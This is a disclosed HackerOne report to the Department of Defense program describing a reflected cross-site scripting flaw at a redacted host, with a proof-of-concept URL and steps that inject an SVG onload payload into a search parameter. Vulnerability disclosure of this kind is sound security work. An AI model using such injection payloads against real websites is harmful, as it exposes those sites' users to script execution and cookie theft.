# Cross-site Scripting (XSS) - Reflected at https://██████████/

## Report Details
- **Report ID**: 1370746
- **URL**: https://hackerone.com/reports/1370746
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-10-15T06:15:02.762Z
- **Disclosed**: 2022-04-07T20:00:53.446Z

## Reporter
- **Username**: mamunwhh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hello Team,
i just found a reflected xss bug on your web https://█████

Step To reproduce:
 poc url: https://████/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E

## Impact

Impact
Data can be stolen, or Javascript can be executed.This is will allow the attacker to steal users cookies

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. go to parameter  https://█████████/7/0/33/1d/www.citysearch.com/search?what=x&where=
2. enter "><svg+onload=confirm(document.domain)>

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
